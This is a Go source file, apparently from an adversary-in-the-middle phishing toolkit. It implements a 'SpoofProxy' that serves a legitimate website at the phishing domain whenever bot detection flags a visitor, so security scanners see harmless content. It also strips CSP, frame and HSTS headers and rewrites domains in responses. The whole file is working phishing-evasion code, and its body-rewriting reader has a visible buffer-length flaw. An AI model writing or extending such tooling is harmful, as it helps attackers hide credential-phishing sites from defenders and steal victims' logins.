package botguard

import (
	"bytes"
	"io"
	"log/slog"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
)

// SpoofProxy transparently reverse-proxies a legitimate website at the
// phishing domain. When BotGuardCheck sets ProxyContext.BotVerdict = VerdictSpoof,
// the pipeline short-circuits and calls SpoofProxy.ServeHTTP. The victim's
// browser sees the content of spoof_url rendered at the phishing domain —
// no redirect is issued.
type SpoofProxy struct {
	logger *slog.Logger
}

func NewSpoofProxy(logger *slog.Logger) *SpoofProxy {
	return &SpoofProxy{logger: logger}
}

// ServeHTTP proxies the incoming request to spoofURL, rewrites domain
// references in the response body, and writes the result back to w.
// If spoofURL is empty, a 200 OK with no body is returned.
func (sp *SpoofProxy) ServeHTTP(w http.ResponseWriter, r *http.Request, spoofURL string, pctx *aitm.ProxyContext) {
	if spoofURL == "" {
		w.WriteHeader(http.StatusOK)
		return
	}

	target, err := url.Parse(spoofURL)
	if err != nil {
		sp.logger.Error("spoofproxy: invalid spoof_url", "url", spoofURL, "error", err)
		w.WriteHeader(http.StatusOK)
		return
	}

	proxy := httputil.NewSingleHostReverseProxy(target)
	proxy.Transport = &http.Transport{
		ResponseHeaderTimeout: 10 * time.Second,
		IdleConnTimeout:       30 * time.Second,
	}

	proxy.Director = func(req *http.Request) {
		req.URL.Scheme = target.Scheme
		req.URL.Host = target.Host
		req.Host = target.Host

		if referer := req.Header.Get("Referer"); referer != "" {
			req.Header.Set("Referer", rewriteHostInURL(referer, target.Host))
		}
		// Remove session tracking cookie so the spoofed site starts fresh.
		removeCookie(req, "_msess")
	}

	proxy.ModifyResponse = func(resp *http.Response) error {
		resp.Header.Del("Content-Security-Policy")
		resp.Header.Del("Content-Security-Policy-Report-Only")
		resp.Header.Del("X-Frame-Options")
		resp.Header.Del("Strict-Transport-Security")
		resp.Header.Del("X-Content-Type-Options")

		if isRewritableContentType(resp.Header.Get("Content-Type")) {
			resp.Body = rewriteDomainsInBody(resp.Body, target.Host, r.Host)
		}
		return nil
	}

	proxy.ErrorHandler = func(w http.ResponseWriter, r *http.Request, err error) {
		sp.logger.Warn("spoofproxy: upstream error", "url", spoofURL, "error", err)
		w.WriteHeader(http.StatusOK) // fail silently
	}

	proxy.ServeHTTP(w, r)
	sp.logger.Debug("spoofproxy: served",
		"spoof_url", spoofURL,
		"phishing_host", r.Host,
		"path", r.URL.Path,
	)
}

func rewriteDomainsInBody(body io.ReadCloser, fromHost, toHost string) io.ReadCloser {
	return &rewriteReader{
		r:    body,
		from: []byte(fromHost),
		to:   []byte(toHost),
	}
}

type rewriteReader struct {
	r    io.ReadCloser
	from []byte
	to   []byte
}

func (rr *rewriteReader) Read(p []byte) (int, error) {
	n, err := rr.r.Read(p)
	if n > 0 {
		replaced := bytes.ReplaceAll(p[:n], rr.from, rr.to)
		copy(p, replaced)
		return len(replaced), err
	}
	return n, err
}

func (rr *rewriteReader) Close() error { return rr.r.Close() }

func isRewritableContentType(ct string) bool {
	for _, rewritable := range []string{
		"text/html", "text/css", "text/javascript",
		"application/javascript", "application/json",
		"application/x-javascript", "image/svg+xml",
	} {
		if strings.HasPrefix(ct, rewritable) {
			return true
		}
	}
	return false
}

func rewriteHostInURL(rawURL, newHost string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	parsed.Host = newHost
	return parsed.String()
}

func removeCookie(r *http.Request, name string) {
	cookies := r.Cookies()
	r.Header.Del("Cookie")
	for _, cookie := range cookies {
		if cookie.Name != name {
			r.AddCookie(cookie)
		}
	}
}
